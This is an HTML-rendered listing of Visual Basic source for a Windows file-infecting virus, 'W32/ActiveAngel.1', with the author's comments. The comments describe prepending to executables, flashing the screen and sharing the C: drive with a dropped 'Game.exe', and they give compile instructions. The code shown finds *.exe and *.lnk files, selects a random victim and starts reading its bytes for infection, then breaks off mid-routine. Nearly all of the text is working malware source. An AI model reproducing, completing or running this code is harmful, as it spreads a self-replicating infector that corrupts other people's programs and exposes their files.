<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ActiveAngel - W32.ActiveAngel.1.frm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc9 {
}
.sc10 {
}
.sc11 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc7">Form1</span><span class="sc0"> </span><span class="sc11">code</span><span class="sc6">:</span><span class="sc0">

</span><span class="sc1">'#
</span><span class="sc0">
</span><span class="sc3">Option</span><span class="sc0"> </span><span class="sc3">Explicit</span><span class="sc0">

</span><span class="sc1">''''''''''''''''''''''''''''''''''''''''
'  W32/ActiveAngel.1 by Genetix {Doomriderz} '
'          Happy christmas! 2006       '
''''''''''''''''''''''''''''''''''''''''
'It spreads by either finding the files linked to shortcut files or just exe files
'in it's directory *decides with random numbers* (picks random file to infect)
'and prepends to them. The payload is the flashing of the screen in random pretty
'colors lol with the flashing of a text "The ActiveAngel virus". And creates a network share,
'sharing the c:\ drive and drops "Game.exe" to it.. i cant think of something else...
</span><span class="sc0">
</span><span class="sc1">' you need to add the timer controle, lebels and other used controles to your VB projects main form befor
' trying to compile this.
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'  Avoid running this virus if you have seizures (Photosensitive epilepsy) '
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
</span><span class="sc0">
</span><span class="sc1">'declare needed API's
</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CopyFile</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"CopyFileA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpExistingFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpNewFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bFailIfExists</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWindowsDirectory</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetWindowsDirectoryA"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hObject</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwDesiredAccess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bInheritHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpExitCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetModuleFileName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc4">"GetModuleFileNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpFileName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetModuleHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
    </span><span class="sc4">"GetModuleHandleA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpModuleName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">AppName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc1">'global variable to hold the virus file name
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H103</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1F0FFF</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">VirusSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">32768</span><span class="sc0"> </span><span class="sc1">'//virus size in bytes
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SigLen</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">'//size of infection marker
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">inf_mark$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"'#"</span><span class="sc0"> </span><span class="sc1">'//marker
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">MAX_PATH</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc1">'//max size of path for windir
</span><span class="sc0">
</span><span class="sc1">'Function to get windows directory
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWindowsDir</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
    </span><span class="sc7">GetWindowsDir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc7">MAX_PATH</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">
    </span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowsDirectory</span><span class="sc6">(</span><span class="sc7">GetWindowsDir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">GetWindowsDir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">GetWindowsDir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Form_Load</span><span class="sc6">()</span><span class="sc0">
    </span><span class="sc1">'//declare some needed variables
</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">hHost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">idHost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SelfName$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">virPath$</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">HostCode</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">HostCode2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">oasis</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">oasis2$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">oasis3$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FindData</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WIN32_FIND_DATA</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">oasisLength</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FreeF</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileArray</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">_</span><span class="sc0">
        </span><span class="sc7">TargetName$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">identify$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">posF</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GetSelfEXE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">FileHand</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">fcount</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WinDir_$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">AngelSource</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
    </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">WinDir_$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowsDir</span><span class="sc6">():</span><span class="sc0"> </span><span class="sc7">oasisLength</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">int1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">int2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FileType</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">rndF</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
    </span><span class="sc7">Randomize</span><span class="sc0">
    </span><span class="sc1">'//Get file name (path included) this way is better than just app.exename
</span><span class="sc0">    </span><span class="sc7">hModule</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetModuleHandle</span><span class="sc6">(</span><span class="sc7">App.EXEName</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">GetModuleFileName</span><span class="sc0"> </span><span class="sc7">hModule</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">buffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">buffer</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">GetSelfEXE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">buffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">buffer</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbNullChar</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNullChar</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">posF</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStrRev</span><span class="sc6">(</span><span class="sc7">GetSelfEXE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">virPath$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">GetSelfEXE</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">posF</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">SelfName$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetSelfEXE</span><span class="sc0">

    </span><span class="sc7">FreeF</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">
    </span><span class="sc7">AppName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SelfName$</span><span class="sc0">
    </span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">AngelSource</span><span class="sc6">(</span><span class="sc7">VirusSize</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'//setup buffer for size of virus
</span><span class="sc0">    </span><span class="sc1">'//Get virus code
</span><span class="sc0">    </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">SelfName$</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">         </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#FreeF, 1, AngelSource
</span><span class="sc0">    </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">    </span><span class="sc1">'//Decide what files to infect
</span><span class="sc0">    </span><span class="sc7">Randomize</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0">
    </span><span class="sc7">FileType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbNullString</span><span class="sc0">
    </span><span class="sc7">rndF</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">rndF</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">FileType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"*.exe"</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">rndF</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">FileType</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"*.lnk"</span><span class="sc0">

    </span><span class="sc1">'//Find files and push them into the array
</span><span class="sc0">    </span><span class="sc7">FileHand</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindFirstFile</span><span class="sc6">(</span><span class="sc7">FileType</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FindData</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">FName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Trim</span><span class="sc6">(</span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">FindData.cFileName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc7">fcount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">FName</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
        </span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc3">Preserve</span><span class="sc0"> </span><span class="sc7">FileArray</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">fcount</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">FileArray</span><span class="sc6">(</span><span class="sc7">fcount</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FName</span><span class="sc0">
        </span><span class="sc7">FindData.cFileName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">FindNextFile</span><span class="sc6">(</span><span class="sc7">FileHand</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">FindData</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">FName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Trim</span><span class="sc6">(</span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">FindData.cFileName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc7">fcount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fcount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc3">Loop</span><span class="sc0">
    </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">FindClose</span><span class="sc6">(</span><span class="sc7">FileHand</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc1">'//pick a random file to infect + get the exe file path from the lnk file
</span><span class="sc0">    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">rndF</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">TargetName$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetTarget</span><span class="sc6">(</span><span class="sc7">FileArray</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">fcount</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)))</span><span class="sc0">
    </span><span class="sc3">Else</span><span class="sc0">
    </span><span class="sc7">TargetName$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">FileArray</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">(</span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc7">fcount</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)))</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">TargetName$</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">GetSelfEXE</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">'//check if its not the virus itself
</span><span class="sc0">        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">FileFound</span><span class="sc6">(</span><span class="sc7">TargetName$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">'check if the file exist befor trying to infect
</span><span class="sc0">            </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">TargetName$</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc4">".exe"</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc1">'//make sure its an executable
</span><span class="sc0">                </span><span class="sc7">oasisLength</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FileLen</span><span class="sc6">(</span><span class="sc7">TargetName$</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'Get the victims files length
</span><span class="sc0">                </span><span class="sc3">ReDim</span><span class="sc0"> </span><span class="sc7">oasis</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">oasisLength</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc1">'create buffer
</span><span class="sc0">                </span><span class="sc7">oasis2$</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">vbNullString</span><span class="sc0"> </span><span class="sc1">'empty this string
</span><span class="sc0">                </span><span class="sc1">'//read the victim bytes into the variable
</span><span class="sc0">                </span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">TargetName$</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">                    </span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#FreeF, , oasis
</span><span class="sc0">                </span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#FreeF
</span><span class="sc0">                </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc1">'//converted it to chr
